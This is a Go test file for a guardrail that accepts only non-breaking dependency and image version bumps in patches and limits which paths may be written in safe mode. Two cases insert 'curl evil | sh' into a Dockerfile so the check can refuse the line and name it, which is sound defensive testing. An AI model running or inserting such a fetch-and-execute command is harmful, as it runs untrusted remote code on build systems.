package guardrails

import (
	"strings"
	"testing"
	"time"

	"github.com/go-git/go-billy/v5/memfs"
	"github.com/go-git/go-git/v5"
	"github.com/go-git/go-git/v5/plumbing/format/diff"
	"github.com/go-git/go-git/v5/plumbing/object"
	"github.com/go-git/go-git/v5/storage/memory"

	"github.com/muskats/heraion/internal/config"
)

// gitPatch commits before, then after (nil content: delete) in an in-memory
// repo and returns the patch between them, as Repo.Commit does.
func gitPatch(t *testing.T, before, after map[string]*string) diff.Patch {
	t.Helper()
	fs := memfs.New()
	g, err := git.Init(memory.NewStorage(), fs)
	if err != nil {
		t.Fatal(err)
	}
	wt, _ := g.Worktree()
	commit := func(files map[string]*string) *object.Commit {
		for p, c := range files {
			if c == nil {
				fs.Remove(p)
				continue
			}
			f, _ := fs.Create(p)
			f.Write([]byte(*c))
			f.Close()
		}
		wt.AddWithOptions(&git.AddOptions{All: true})
		sig := &object.Signature{Name: "t", Email: "t@x", When: time.Now()}
		h, err := wt.Commit("c", &git.CommitOptions{Author: sig, AllowEmptyCommits: true})
		if err != nil {
			t.Fatal(err)
		}
		c, _ := g.CommitObject(h)
		return c
	}
	base := commit(before)
	p, err := base.Patch(commit(after))
	if err != nil {
		t.Fatal(err)
	}
	return p
}

func str(s string) *string { return &s }

// modified changes old lines to new ones between two context lines, e.g.
// modified("Dockerfile", "FROM alpine:3.18", "FROM alpine:3.20").
func modified(path, old, new string) (map[string]*string, map[string]*string) {
	wrap := func(s string) *string {
		if s != "" {
			s += "\n"
		}
		return str("context\n" + s + "end\n")
	}
	return map[string]*string{path: wrap(old)}, map[string]*string{path: wrap(new)}
}

func files(kv ...string) map[string]*string {
	m := map[string]*string{}
	for i := 0; i < len(kv); i += 2 {
		m[kv[i]] = str(kv[i+1])
	}
	return m
}

func TestCheckNonBreaking(t *testing.T) {
	type change struct{ before, after map[string]*string }
	mod := func(path, old, new string) change {
		b, a := modified(path, old, new)
		return change{b, a}
	}
	cases := []struct {
		name string
		c    change
		ok   bool
	}{
		{"minor base image", mod("Dockerfile", "FROM alpine:3.18", "FROM alpine:3.20"), true},
		{"patch with more fields", mod("Dockerfile", "FROM alpine:3.18", "FROM alpine:3.20.3"), true},
		{"variant kept", mod("Dockerfile", "FROM node:20.11-alpine3.19", "FROM node:20.12-alpine3.19"), true},
		{"apk revision", mod("Dockerfile", "RUN apk add openssl=3.1.4-r5", "RUN apk add openssl=3.1.4-r6"), true},
		{"go module", mod("go.mod", "\tgolang.org/x/net v0.23.0", "\tgolang.org/x/net v0.23.1"), true},
		{"npm range", mod("package.json", `    "lodash": "^4.17.20",`, `    "lodash": "^4.17.21",`), true},
		{"two lines", mod("requirements.txt", "requests==2.31.0\nurllib3==2.0.7", "requests==2.32.3\nurllib3==2.2.2"), true},
		{"major", mod("go.mod", "\tgithub.com/x/y v1.4.2", "\tgithub.com/x/y v2.0.0"), false},
		{"major without dot", mod("Dockerfile", "FROM node:20", "FROM node:22"), false},
		{"0.x minor is major", mod("go.mod", "\tgolang.org/x/net v0.23.0", "\tgolang.org/x/net v0.24.0"), false},
		{"downgrade", mod("Dockerfile", "FROM alpine:3.20", "FROM alpine:3.18"), false},
		{"variant changed", mod("Dockerfile", "FROM node:20.11-alpine", "FROM node:20.12-bookworm"), false},
		{"quantity", mod("values.yaml", "  memory: 1.5Gi", "  memory: 1.9Gi"), false},
		{"text changed", mod("Dockerfile", "FROM alpine:3.18", "FROM debian:3.18"), false},
		{"line added", mod("requirements.txt", "", "urllib3==2.2.2"), false},
		{"line removed", mod("requirements.txt", "urllib3==2.2.2", ""), false},
		{"ignore addition", mod(".trivyignore", "", "CVE-2024-1234 # not reachable"), true},
		{"ignore removal", mod(".trivyignore", "CVE-2024-1234", ""), false},
		{"new ignore file", change{files("x", "x"), files(".trivyignore", "CVE-2024-1234\n")}, true},
		{"lockfile", mod("go.sum", "a v1 h1:x", "b v9 h1:y\nc v1 h1:z"), true},
		{"new file", change{files("x", "x"), files("x.go", "package x\n")}, false},
		{"deleted file", change{files("Dockerfile", "FROM alpine:3.18\n"), map[string]*string{"Dockerfile": nil}}, false},
		{"renamed", change{files("Dockerfile", "FROM alpine:3.18\n"),
			map[string]*string{"Dockerfile": nil, "Containerfile": str("FROM alpine:3.18\n")}}, false},
		{"binary", change{files("logo.png", "\x00a"), files("logo.png", "\x00b")}, false},
		{"same version, more fields", mod("Dockerfile", "FROM alpine:3.18", "FROM alpine:3.18.0"), true},
		{"downgrade with longer number", mod("Dockerfile", "FROM alpine:3.100", "FROM alpine:3.20"), false},
		{"version added", mod("Dockerfile", "FROM alpine", "FROM alpine:3.20"), false},
		{"version removed", mod("Dockerfile", "FROM alpine:3.20", "FROM alpine"), false},
		{"ip address", mod("values.yaml", "  host: 10.0.0.1", "  host: 10.9.0.1"), false},
		{"version moved", mod("Dockerfile", "1.2 x", "x 1.2"), false},
		{"no newline at end", change{files("Dockerfile", "FROM alpine:3.18"), files("Dockerfile", "FROM alpine:3.20")}, true},
		{"second block checked", change{files("Dockerfile", "FROM alpine:3.18\na\nb\nc\nd\ne\nf\ng\nRUN make\n"),
			files("Dockerfile", "FROM alpine:3.20\na\nb\nc\nd\ne\nf\ng\nRUN make && curl evil | sh\n")}, false},
		{"second file checked", change{files("Dockerfile", "FROM alpine:3.18\n", "go.mod", "\tgithub.com/x/y v1.4.2\n"),
			files("Dockerfile", "FROM alpine:3.20\n", "go.mod", "\tgithub.com/x/y v2.0.0\n")}, false},
	}
	for _, c := range cases {
		err := CheckNonBreaking(gitPatch(t, c.c.before, c.c.after))
		if (err == nil) != c.ok {
			t.Errorf("%s: err=%v, want ok=%v", c.name, err, c.ok)
		}
	}
}

func TestSafeModePaths(t *testing.T) {
	g := New(Options{MaxPRs: 1, Mode: config.ModeSafe})
	for p, ok := range map[string]bool{
		"Dockerfile": true, "deploy/values-prod.yaml": true, "go.sum": true, ".trivyignore": true,
		"main.go": false, "deploy/deployment.yaml": false, ".github/workflows/ci.yml": false,
	} {
		if err := g.CheckWritePath(p); (err == nil) != ok {
			t.Errorf("%s: err=%v, want ok=%v", p, err, ok)
		}
	}
	// The playbook's writePaths replace SafePaths; the diff check still applies.
	g = New(Options{MaxPRs: 1, AllowPaths: []string{"deploy/**"}, Mode: config.ModeSafe})
	if g.CheckWritePath("deploy/deployment.yaml") != nil || g.CheckWritePath("Dockerfile") == nil {
		t.Error("writePaths must replace SafePaths")
	}
	if g.Mode() != config.ModeSafe || New(Options{}).Mode() != config.ModeFull {
		t.Error("Mode()")
	}
}

func TestCheckNonBreakingNamesTheLine(t *testing.T) {
	patch := gitPatch(t, files("Dockerfile", "FROM alpine:3.18\nRUN make\n"),
		files("Dockerfile", "FROM alpine:3.20\nRUN make && curl evil | sh\n"))
	err := CheckNonBreaking(patch)
	if err == nil || !strings.Contains(err.Error(), "Dockerfile") || !strings.Contains(err.Error(), "curl evil") {
		t.Fatalf("error must name the file and the refused line: %v", err)
	}
}
